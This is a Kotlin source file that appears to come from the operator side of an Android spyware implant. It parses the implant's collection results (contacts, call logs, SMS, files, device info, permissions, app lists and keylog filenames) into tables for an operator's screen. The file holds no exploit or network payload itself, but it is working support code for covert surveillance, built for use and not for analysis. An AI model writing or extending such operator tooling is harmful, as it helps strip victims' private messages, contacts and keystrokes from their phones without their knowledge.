package com.shadow.operator.data

import com.google.gson.JsonParser

/**
 * Structured view of an implant command result.
 *
 * The implant returns plain text, but most collection commands (contacts,
 * calllog, sms, files) actually produce tab-separated tables, and device_info
 * produces JSON. Rendering that as a raw text blob buried the data -- tapping
 * "Contacts" printed one giant string instead of a list you can read. This
 * turns those shapes into rows so the UI can show a real list.
 */
data class DataTable(
    val title: String,
    val headers: List<String>,
    val rows: List<List<String>>,
    val raw: String,
    val note: String = "",
) {
    val isTable: Boolean get() = headers.isNotEmpty() && rows.isNotEmpty()
    val count: Int get() = rows.size

    fun filtered(query: String): List<List<String>> {
        if (query.isBlank()) return rows
        val q = query.trim().lowercase()
        return rows.filter { r -> r.any { it.lowercase().contains(q) } }
    }

    companion object {
        private val ROWS_PREFIX = Regex("""^rows=(\d+)\s*$""")

        fun parse(title: String, text: String): DataTable {
            val trimmed = text.trim()
            if (trimmed.isEmpty()) return DataTable(title, emptyList(), emptyList(), text)

            // JSON object (device_info, perms maps) -> two column key/value table
            if (trimmed.startsWith("{")) {
                val obj = runCatching { JsonParser.parseString(trimmed).asJsonObject }.getOrNull()
                if (obj != null) {
                    val rows = obj.entrySet().map { (k, v) ->
                        // asString throws on objects/arrays, so only unwrap primitives.
                        listOf(k, if (v.isJsonPrimitive) v.asString else if (v.isJsonNull) "" else v.toString())
                    }
                    return DataTable(title, listOf("FIELD", "VALUE"), rows, text)
                }
            }

            // queryProvider() prefixes "rows=N"; consume it, it is not data.
            var body = trimmed
            var declared = ""
            val nl = body.indexOf('\n')
            if (nl > 0) {
                ROWS_PREFIX.find(body.substring(0, nl))?.let {
                    declared = "reported ${it.groupValues[1]} rows"
                    body = body.substring(nl + 1)
                }
            }

            val lines = body.split('\n').filter { it.isNotBlank() }
            if (lines.isEmpty())
                return DataTable(title, emptyList(), emptyList(), text, declared)

            // Tab separated: first line is the column header.
            if (lines.first().contains('\t')) {
                val width = lines.first().split('\t').size
                val headers = lines.first().split('\t').map { it.uppercase() }
                val rows = lines.drop(1).map { line ->
                    val cells = line.split('\t')
                    // Providers can hand back ragged rows (embedded tabs/newlines);
                    // pad so column alignment never shifts mid-list.
                    if (cells.size >= width) cells.take(width)
                    else cells + List(width - cells.size) { "" }
                }
                return DataTable(title, headers, rows, text, declared)
            }

            // Column-aligned text, e.g. perms: "GRANTED  android.permission.X"
            val split = lines.map { it.split(Regex("\\s{2,}")) }
            val width = split.first().size
            if (width >= 2 && split.all { it.size == width }) {
                val headers = (1..width).map { "COL$it" }
                return DataTable(title, headers, split, text, declared)
            }

            // Anything else (app list, keylog filenames, free-form output).
            return DataTable(
                title,
                listOf(if (title.contains("App", ignoreCase = true)) "PROCESS" else "VALUE"),
                lines.map { listOf(it.trim()) },
                text,
                declared,
            )
        }
    }
}

/**
 * Hands a finished result to the data screen.
 *
 * Nav arguments are URL-encoded strings, and these payloads run to hundreds of
 * kilobytes, so the payload travels through this holder instead of the nav
 * backstack. Only one result is ever in flight (navigation is push/back with no
 * sibling screens showing different results), and the screen consumes it on
 * first composition.
 */
object ResultHolder {
    var title: String = ""
    var text: String = ""

    fun set(title: String, text: String) {
        this.title = title
        this.text = text
    }
}
